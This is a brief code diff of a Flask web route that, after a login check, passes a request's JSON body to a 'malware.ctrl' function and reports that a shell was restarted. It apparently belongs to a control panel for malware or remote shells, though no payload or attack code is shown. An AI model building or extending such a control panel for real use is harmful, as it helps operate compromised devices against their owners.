@@ -109,7 +109,7 @@ def ctrl():
         if not is_logged_in():
             return redirect(url_for('login'))
         data = request.get_json()
-        malware.ctrl(data["device_id"])
+        malware.ctrl(data)
         return jsonify(result='Shell restarted successfully'), 200
     except Exception as err:
         return jsonify(result=str(err)), 500
